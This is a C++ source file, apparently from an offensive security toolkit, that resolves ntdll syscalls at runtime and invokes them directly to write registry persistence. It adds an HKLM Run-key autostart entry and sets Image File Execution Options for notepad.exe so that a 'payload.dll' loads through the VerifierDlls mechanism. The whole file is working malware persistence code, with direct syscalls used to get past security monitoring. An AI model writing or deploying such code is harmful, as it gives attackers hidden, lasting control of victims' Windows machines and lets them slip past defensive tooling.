#include "registry_run_keys.hpp"
#include "../core/asm/asm_functions.h"
#include "../core/pe_peb_parser.hpp"
#include <cstddef>
#include <errhandlingapi.h>
#include <iostream>
#include <ntdef.h>
#include <vector>
#include <wchar.h>
#include <windows.h>
#include <winerror.h>
#include <winnt.h>
#include <winternl.h>
PVOID g_SyscallAddress = NULL;
DWORD g_SyscallNumber = 0;
int main() {
  std::vector<VX_TABLE_ENTRY> syscalls;
  const wchar_t *base = L"ntdll.dll";
  PVOID ntdll_baseaddr = get_base(base);
  const char *names[] = {"NtCreateKey", "NtSetValueKey", "NtClose"};
  parse_exports(ntdll_baseaddr, names, 3, syscalls);
  if (syscalls.size() != 3) {
    return 1;
  }
  if (!is_hkey_added(syscalls)) {
    return 1;
  }
  if (!ifeo_persistence(syscalls)) {
    return 1;
  }
  return 0;
}
bool is_hkey_added(std::vector<VX_TABLE_ENTRY> &vx) {
  g_SyscallNumber = vx[0].wSystemCall;
  g_SyscallAddress = vx[0].pAddress;
  ULONG disposition;
  HANDLE hkey = NULL;
  OBJECT_ATTRIBUTES att;
  const wchar_t *obj_name =
      L"\\Registry\\Machine\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
  UNICODE_STRING forsyscall;
  RtlInitUnicodeString(&forsyscall, obj_name);
  InitializeObjectAttributes(&att, &forsyscall, OBJ_CASE_INSENSITIVE, NULL,
                             NULL);
  NTSTATUS status = (NTSTATUS)call_syscall8(
      (PVOID)&hkey, (PVOID)(KEY_ALL_ACCESS), (PVOID)&att, NULL, NULL,
      (PVOID)REG_OPTION_NON_VOLATILE, &disposition, NULL);
  if (!NT_SUCCESS(status) || hkey == NULL) {
    return false;
  }
  g_SyscallAddress = vx[1].pAddress;
  g_SyscallNumber = vx[1].wSystemCall;
  const wchar_t *lipa = L"path\\to\\exe";
  const wchar_t *test = L"myapp";
  UNICODE_STRING test_app;
  RtlInitUnicodeString(&test_app, test);
  status = (NTSTATUS)call_syscall8(
      (PVOID)hkey, (PVOID)&test_app, (PVOID)0, (PVOID)REG_SZ, (PVOID)lipa,
      (PVOID)((wcslen(lipa) + 1) * sizeof(WCHAR)), NULL, NULL);
  if (!NT_SUCCESS(status)) {
    g_SyscallAddress = vx[2].pAddress;
    g_SyscallNumber = vx[2].wSystemCall;
    call_syscall4((PVOID)hkey, NULL, NULL, NULL);
    return false;
  }
  g_SyscallAddress = vx[2].pAddress;
  g_SyscallNumber = vx[2].wSystemCall;
  call_syscall4((PVOID)hkey, NULL, NULL, NULL);
  return true;
}
bool ifeo_persistence(std::vector<VX_TABLE_ENTRY> &vx) {
  g_SyscallAddress = vx[0].pAddress;
  g_SyscallNumber = vx[0].wSystemCall;
  HANDLE ifeo_hkey = NULL;
  DWORD flag = 0x1000;
  OBJECT_ATTRIBUTES att;
  const wchar_t *string =
      L"\\Registry\\Machine\\Software\\Microsoft\\Windows "
      L"NT\\CurrentVersion\\Image File Execution Options\\notepad.exe";
  UNICODE_STRING arg;
  RtlInitUnicodeString(&arg, string);
  InitializeObjectAttributes(&att, &arg, OBJ_CASE_INSENSITIVE, NULL, NULL);
  NTSTATUS status = (NTSTATUS)call_syscall8(
      (PVOID)&ifeo_hkey, (PVOID)(KEY_WRITE | KEY_READ), (PVOID)&att, NULL, NULL,
      (PVOID)REG_OPTION_NON_VOLATILE, NULL, NULL);
  if (!NT_SUCCESS(status) || ifeo_hkey == NULL) {
    return false;
  }
  g_SyscallAddress = vx[1].pAddress;
  g_SyscallNumber = vx[1].wSystemCall;
  const wchar_t *valueName = L"VerifierDlls";
  UNICODE_STRING valueNameStr;
  RtlInitUnicodeString(&valueNameStr, valueName);
  const wchar_t *nameofflag = L"GlobalFlag";
  UNICODE_STRING GlobalFlag;
  RtlInitUnicodeString(&GlobalFlag, nameofflag);
  const wchar_t *dllpath = L"C:\\Users\\Public\\payload.dll";
  status = (NTSTATUS)call_syscall8(
      (PVOID)ifeo_hkey, (PVOID)&valueNameStr, (PVOID)0, (PVOID)REG_SZ,
      (PVOID)dllpath, (PVOID)((wcslen(dllpath) + 1) * sizeof(WCHAR)), NULL,
      NULL);
  if (!NT_SUCCESS(status)) {
    g_SyscallAddress = vx[2].pAddress;
    g_SyscallNumber = vx[2].wSystemCall;
    call_syscall4(ifeo_hkey, NULL, NULL, NULL);
    return false;
  }
  status = (NTSTATUS)call_syscall8((PVOID)ifeo_hkey, (PVOID)&GlobalFlag,
                                   (PVOID)0, (PVOID)REG_DWORD, (PVOID)&flag,
                                   (PVOID)sizeof(DWORD), NULL, NULL);
  if (!NT_SUCCESS(status)) {
    g_SyscallAddress = vx[2].pAddress;
    g_SyscallNumber = vx[2].wSystemCall;
    call_syscall4(ifeo_hkey, NULL, NULL, NULL);
    return false;
  }
  g_SyscallAddress = vx[2].pAddress;
  g_SyscallNumber = vx[2].wSystemCall;
  call_syscall4(ifeo_hkey, NULL, NULL, NULL);
  return true;
}
